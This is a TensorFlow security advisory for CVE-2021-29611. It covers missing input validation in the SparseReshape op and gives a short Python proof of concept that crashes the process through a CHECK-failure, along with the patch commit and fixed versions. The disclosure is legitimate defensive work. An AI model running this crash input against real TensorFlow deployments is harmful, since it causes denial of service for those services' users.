## TFSA-2021-098: Incomplete validation in `SparseReshape`

### CVE Number
CVE-2021-29611

### Impact
Incomplete validation in `SparseReshape` results in a denial of service based on
a `CHECK`-failure.

```python
import tensorflow as tf

input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)
input_shape = tf.zeros([11], dtype=tf.int64)
new_shape = tf.zeros([1], dtype=tf.int64)

tf.raw_ops.SparseReshape(input_indices=input_indices,
    input_shape=input_shape,
    new_shape=new_shape)
```

The
[implementation](https://github.com/tensorflow/tensorflow/blob/e87b51ce05c3eb172065a6ea5f48415854223285/tensorflow/core/kernels/sparse_reshape_op.cc#L40)
has no validation that the input arguments specify a valid sparse tensor.

### Patches
We have patched the issue in GitHub commit
[1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6](https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2 and TensorFlow 2.3.3, as these are the only affected
versions.
